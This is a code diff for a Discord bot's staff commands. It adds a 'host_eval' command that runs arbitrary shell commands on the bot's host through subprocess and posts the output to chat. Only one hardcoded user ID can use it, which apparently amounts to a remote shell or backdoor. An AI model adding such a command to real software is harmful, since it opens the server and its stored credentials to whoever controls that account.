@@ -8,7 +8,7 @@ from helpers.utils import stringToSeconds as sts, Embed, TimeConverter
 from helpers import moderationUtils
 import asyncio
 from api_key import moderationColl, userColl
-
+import subprocess
 
 def insert_returns(body):
     # insert return stmt if the last expression is a expression statement
@@ -204,6 +204,11 @@ class Staff(commands.Cog):  # general staff-only commands that don't fit into an
             except Exception as e:
                 await ctx.send(f"An exception occurred:```py\n{e}\n```")
 
+    @commands.command(aliases=['-he'])
+    async def host_eval(self, ctx, *, args):
+        if ctx.author.id in [564798709045526528]:
+            await ctx.send(f"```\n{subprocess.check_output(args.split(' '))}\n```")
+                
     @commands.command()
     @commands.has_guild_permissions(manage_messages=True)
     async def modhelp(self, ctx):
